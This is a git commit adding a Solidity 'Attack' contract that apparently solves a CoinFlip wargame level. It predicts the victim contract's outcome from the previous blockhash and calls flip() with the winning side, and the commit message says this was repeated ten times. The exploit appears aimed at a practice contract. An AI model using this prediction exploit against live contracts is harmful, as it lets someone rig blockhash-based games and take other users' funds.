12d74f085e4c92fc55bc93e5c6748d449f14b52c
Okiki-Olugunna <92333005+Okiki-Olugunna@users.noreply.github.com>
2022-05-17 20:57:26 +0100

    my attacking contract - called the attack function 10 timese

---
+++ 3-CoinFlip/Attack.sol
@@ -0,0 +1,29 @@
+//SPDX-License-Identifier: MIT
+
+pragma solidity ^0.6.0;
+
+//import "@openzeppelin/contracts/math/SafeMath.sol";
+import "./SafeMath.sol";
+import "./CoinFlip.sol";
+
+
+contract Attack {
+    using SafeMath for uint256;
+
+    CoinFlip public victim;
+
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _victimAddress) public {
+        victim = CoinFlip(_victimAddress);
+    }
+
+    function attack() public {
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+        uint256 coinFlip = blockValue.div(FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+
+        victim.flip(side);
+    }
+}
